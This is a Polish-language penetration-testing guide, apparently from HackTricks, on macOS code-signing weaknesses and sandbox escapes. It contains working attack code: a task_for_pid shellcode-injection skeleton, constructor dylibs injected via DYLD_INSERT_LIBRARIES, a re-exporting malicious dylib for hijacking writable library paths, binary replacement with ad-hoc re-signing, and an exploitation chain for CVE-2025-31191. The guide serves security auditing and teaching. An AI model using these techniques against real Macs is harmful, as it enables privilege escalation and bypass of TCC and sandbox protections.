# Słabości Code Signing w macOS i ucieczki z Sandbox

{{#include ../../../banners/hacktricks-training.md}}

## Binarne pliki podpisane Ad-hoc

### Podstawowe informacje

**Podpisywanie Ad-hoc** (`CS_ADHOC`) tworzy sygnaturę kodu **bez łańcucha certyfikatów**. Nadal oblicza hash podpisanego kodu, więc walidacja może wykryć modyfikację, ale nie zapewnia tożsamości dewelopera, którą inny komponent mógłby uwierzytelnić. Zastąpienie i ponowne podpisanie pliku wykonywalnego tworzy inny CodeDirectory/CDHash.<sup>[[1]](#references)[[4]](#references)</sup>

Na Macach z Apple Silicon wszystkie pliki wykonywalne wymagają co najmniej sygnatury Ad-hoc. Oznacza to, że sygnatury Ad-hoc znajdziesz w wielu narzędziach deweloperskich, pakietach Homebrew i narzędziach firm trzecich.

### Dlaczego ma to znaczenie

- **Brak weryfikowalnej tożsamości sygnatariusza** — kontrole, które akceptują wyłącznie ścieżkę, status Ad-hoc lub nieprzypięty identyfikator, nie mogą ustalić, kto utworzył plik binarny.
- Binarne pliki Ad-hoc firm trzecich w **uprzywilejowanych miejscach** (FDA, daemony, helpery) są celami o wysokim priorytecie, gdy ich plik lub katalog nadrzędny jest zapisywalny.
- CDHash, designated-requirement lub kontrola TCC oparta na requirement **wykrywa** zastąpienie. Polityka oparta na ścieżce może tego nie wykryć; przeanalizuj faktyczny requirement i ponownie przetestuj przyznane uprawnienie, zamiast zakładać, że pozostanie ono aktywne po ponownym podpisaniu.

### Rozpoznanie
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Procesy możliwe do debugowania (get-task-allow)

### Podstawowe informacje

Entitlement **`com.apple.security.get-task-allow`** (lub flaga **`CS_GET_TASK_ALLOW`**) zezwala autoryzowanemu debuggerowi na uzyskanie portu zadania procesu, nawet gdy Hardened Runtime normalnie by na to nie zezwalał. Udany debugger może odczytywać pamięć, modyfikować rejestry, wstrzykiwać kod i przejmować kontrolę nad wykonaniem.<sup>[[3]](#references)</sup>

Jest to przeznaczone **wyłącznie dla buildów deweloperskich**. Jednak niektóre binaria firm trzecich są dostarczane w produkcji z tym entitlementem.

> [!CAUTION]
> Produkcyjne binarium z `get-task-allow` stanowi silny prymityw eksploatacji. `taskgated`, tożsamość wywołującego, sandboxing, entitlements debuggera oraz autoryzacja Developer Tools nadal wpływają na to, czy konkretny klient może uzyskać port zadania; należy przeprowadzić testy zarówno z użyciem `lldb`/`debugserver`, jak i docelowego injectora. Po pomyślnym podłączeniu wstrzyknięty kod działa z entitlementami celu, uprawnieniami TCC i kontekstem bezpieczeństwa celu.

### Wykrywanie
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Atak: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Brak walidacji bibliotek + środowisko DYLD

### Czyszczenie walidacji bibliotek w czasie działania

Prywatne entitlement **`com.apple.private.security.clear-library-validation`** nie wyłącza walidacji bibliotek podczas uruchamiania procesu. Zamiast tego pozwala procesowi wywołać `csops(..., CS_OPS_CLEAR_LV, ...)` na samym sobie w czasie działania. XNU następnie czyści `CS_REQUIRE_LV | CS_FORCED_LV`, pod warunkiem że wywołujący ma ten entitlement i spełnia dodatkowe kontrole handlera. W konsekwencji proces może stać się podatnym celem dla library injection dopiero po dotarciu do ścieżki kodu, która czyści walidację bibliotek.<sup>[[4]](#references)[[5]](#references)</sup>

### Zabójcze połączenie

Gdy binary ma **oba**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (ładuje dowolny dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (akceptuje zmienne środowiskowe DYLD)

Jest to połączenie o wysokiej wartości w kontekście code injection, ponieważ Hardened Runtime zezwala zarówno na niezaufaną bibliotekę, jak i zmienną środowiskową DYLD. Kontekst uruchamiania może nadal usuwać zmienne DYLD (na przykład w przypadku chronionych lub uprzywilejowanych ścieżek wykonywania), dlatego należy zweryfikować dokładne wywołanie zamiast traktować parę entitlementów jako bezwarunkową.

### Odkrywanie
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Atak: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Tymczasowe wyjątki Sandbox

### Jak osłabiają Sandbox

Tymczasowe wyjątki Sandbox (`com.apple.security.temporary-exception.*`) tworzą luki w App Sandbox:<sup>[[2]](#references)</sup>

| Wyjątek | Co umożliwia |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Łączenie się z systemowymi usługami XPC/Mach |
| `temporary-exception.files.absolute-path.read-write` | Odczyt/zapis plików poza kontenerem aplikacji |
| `temporary-exception.iokit-user-client-class` | Otwieranie połączeń z klientami użytkownika IOKit |
| `temporary-exception.shared-preference.read-only` | Odczyt preferencji innych aplikacji |
| `temporary-exception.files.home-relative-path.read-write` | Dostęp do ścieżek względnych względem `~` |

### Wyjątki Mach-Lookup = prymityw Sandbox Escape

Najbardziej niebezpiecznym wyjątkiem jest **mach-lookup** — umożliwia aplikacji działającej w Sandboxie komunikowanie się z uprzywilejowanymi daemonami:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Sandbox Escape przez Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Weryfikacja code-signing nie zapewnia integralności klienta XPC

Usługa XPC może uwierzytelniać połączenie, wyodrębniając stan code-signing z tokena audytowego i akceptując **platform binary** Apple albo klienta z flagą `CS_REQUIRE_LV`/`CS_FORCED_LV`. Testy te opisują plik wykonywalny i wybrane flagi procesu; nie dowodzą, że bieżąca przestrzeń adresowa zawiera wyłącznie zaufany kod. Badania usług ImageCapture wykazały, że podatny na injection plik binarny Apple, taki jak `/bin/ls`, mógł załadować dylib atakującego przez `DYLD_INSERT_LIBRARIES`, a następnie połączyć się jako klient platformowy. Dodatkowa kontrola flag library-validation również została ominięta, zanim Apple zmieniło usługę tak, aby w macOS 15 wymagała prywatnego entitlementu autoryzacyjnego.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Zreverse-engineeruj `listener:shouldAcceptNewConnection:` (lub równoważny niskopoziomowy handler XPC) i zidentyfikuj decyzje oparte wyłącznie na `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` lub `CS_FORCED_LV`.
2. Wylicz klientów podpisanych przez Apple, którzy mogą komunikować się za pomocą tego protokołu, a następnie sprawdź Hardened Runtime i entitlementy. Sama sygnatura platformowa nie jest dowodem, że injection przez DYLD jest zablokowany.
3. Przetestuj kandydata na **docelowym buildzie macOS**. Jeśli dylib konstruktora zostanie załadowana, nawiąż połączenie z usługą z poziomu tego konstruktora, aby token audytowy należał do zaakceptowanego procesu platformowego.
4. Ponownie przetestuj każdą poprawkę dostawcy: dodanie kolejnej modyfikowalnej flagi statusu procesu do tej samej decyzji autoryzacyjnej może nie usunąć prymitywu confused deputy.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> Zachowanie DYLD, polityka AMFI oraz kontrole po stronie usług zmieniają się między wydaniami macOS. Niepowodzenie na w pełni załatanym hoście nie dowodzi, że ten sam łańcuch nie zadziałał na podatnej wersji.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Zakładki z zakresem bezpieczeństwa zachowują wybór pliku użytkownika między uruchomieniami. Rozszerzenie sandboxa jest powiązane z uruchomieniem systemu, dlatego `ScopedBookmarkAgent` je weryfikuje i tworzy długotrwałą zakładkę uwierzytelnianą za pomocą HMAC; gdy aplikacja później przedstawia tę zakładkę, agent ją weryfikuje i wydaje nowe rozszerzenie sandboxa. Sekret używany do podpisywania jest przechowywany w login keychain, a klucz specyficzny dla aplikacji jest wyprowadzany z użyciem identyfikatora bundle.<sup>[[7]](#references)</sup>

W podatnych systemach ACL keychaina uniemożliwiał niezaufanemu procesowi **odczytanie** sekretu `com.apple.scopedbookmarksagent.xpc`, ale nie uniemożliwiał jego usunięcia. Przejęta aplikacja działająca w sandboxie mogła zastąpić element znanym sekretem i kontrolowanym przez atakującego ACL, wyprowadzić specyficzny dla aplikacji klucz HMAC, sfałszować wpisy w zapisywalnym pliku plist zakładek kontenera, a następnie poprosić `ScopedBookmarkAgent` o wymianę ich na rozszerzenia umożliwiające dostęp do plików. Zmieniało to każdą aplikację działającą w sandboxie i używającą zakładek z zakresem bezpieczeństwa w potencjalny sandbox escape zapewniający dostęp do dowolnych plików, bez dodatkowej interakcji z file pickerem. Apple naprawiło ten problem w aktualizacjach bezpieczeństwa z 31 marca 2025 r.<sup>[[7]](#references)</sup>

### Triage i łańcuch ataku
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
Sekwencja eksploatacji na podatnym hoście wygląda następująco:

1. Uzyskaj wykonanie kodu wewnątrz aplikacji działającej w sandboxie, która używa persistent scoped bookmarks.
2. Zastąp element podpisujący keychain agenta znanym sekretem i liberalnym ACL.
3. Oblicz `HMAC-SHA256(key=known_secret, data=bundle_id)` i sfałszuj bookmark dla użytecznej ścieżki w zapisywalnym magazynie bookmarków aplikacji.
4. Wywołaj standardową ścieżkę rozwiązywania bookmarków aplikacji, aby `ScopedBookmarkAgent` zwrócił rozszerzenie sandboxa.
5. Użyj nowego dostępu do plików, aby nadpisać dostępny dla tego użytkownika cel wykonania kodu lub danych znajdujący się poza sandboxem.

Jest to **technika dla załatanej wersji**: używaj jej do zrozumienia granicy zaufania i oceny niezałatanych systemów, a nie jako założenia dotyczącego bieżących wydań. Podczas aktualnych testów skup się na parsowaniu bookmarków, wiązaniu tożsamości, cyklu życia elementu keychain oraz zachowaniu confused deputy wokół agenta.

---

## Prywatne Apple Entitlements

### Czym są

Entitlements z prefiksem `com.apple.private.*` zapewniają dostęp do **wewnętrznych API Apple**, które nie są udokumentowane ani dostępne dla zewnętrznych developerów. Binarne pliki stron trzecich z private entitlements uzyskiwały je za pośrednictwem enterprise cert, MDM lub dystrybucji spoza App Store.

### Niebezpieczne Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Pełny odczyt/zapis bazy danych TCC |
| `com.apple.private.tcc.allow` | Dostęp do określonych usług TCC |
| `com.apple.private.security.no-sandbox` | Uruchamianie bez sandboxa |
| `com.apple.private.iokit` | Bezpośredni dostęp do sterowników IOKit |
| `com.apple.private.kernel.\*` | Dostęp do interfejsu kernela |
| `com.apple.private.xpc.launchd.job-label` | Rejestrowanie i zarządzanie zadaniami launchd |
| `com.apple.rootless.install` | Zapis do ścieżek chronionych przez SIP |

### Rozpoznanie
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Niestandardowe profile Sandbox (SBPL)

### Czym są

Pliki binarne mogą być dostarczane z **niestandardowymi profilami Sandbox** napisanymi w SBPL (Seatbelt Profile Language). Profile te mogą być bardziej restrykcyjne LUB **bardziej liberalne** niż domyślny App Sandbox.

### Audytowanie niestandardowych profili
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Ścieżki bibliotek z prawem zapisu

### Czym są

Gdy binary ładuje dynamic library ze ścieżki, do której bieżący użytkownik ma **prawo zapisu**, bibliotekę można zastąpić złośliwym kodem.

### Rozpoznanie
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Atak: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Przewodnik po podpisywaniu kodu](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Uprawnienia](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (operacje `CS_OPS_*` i `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (handler `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Nowa era macOS Sandbox Escapes: analiza pomijanej powierzchni ataku i odkrycie ponad 10 nowych podatności](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Analiza CVE-2025-31191: macOS security-scoped bookmarks-based sandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
